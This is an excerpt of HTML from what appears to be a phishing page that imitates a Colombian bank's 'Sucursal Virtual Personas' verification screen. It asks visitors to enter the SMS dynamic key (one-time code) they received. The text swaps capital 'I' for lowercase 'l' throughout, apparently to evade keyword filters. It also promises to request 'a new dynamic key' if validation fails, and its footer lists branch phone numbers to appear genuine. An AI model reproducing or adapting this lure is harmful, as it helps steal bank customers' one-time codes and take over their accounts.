...
<html>
	<head>
  		<title>ERROR de Validacion -  Sucursal Vitrual Personas</title>
   	...
   	<body>
   		<div class="contenido">
   			<div class="cabecera">
   				...
   				<div class="titulo">Ahora Verificar tu cuenta es fáciI</div>
   				<div class="mensaje">
   					<table>
   						<tr>
   			...
   			<div class="cuerpo">
   				<div class="pnlizq">
   					<div class="formulario">
						   ...
						   lngresa Ia CIave Dinamica que recibistes por mensaje de texto "SMS" Revisa en tu buzon de entrada.
   						</div>
   						<div class="form-cuerpo">
   							<div style="text-align: left;">
   								<img src="../../../../../src/img/info.jpg" class="icon-info"><span class="etiqueta"> Ingrese su Clave Dinamica</span>
   							</div>   						
   				...
   				<div class="pnlder">
   					...
   					<div class="texto" style="text-align:justify; padding: 0px 30px;">Despues de verificarte, tendrás que esperar unos segundos, de ser vaIida tu identidad continuaras al siguiente paso. De Io contrario soIicitaremos una nueva dinamica.</div>
   				</div>
   			</div>
   			<div class="pie">
   				<div class="direccion">SucursaI TeIefonica: Bogotá (57) 60 1 343 00 00 - MedeIIín (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 -<br class="salto-pie">
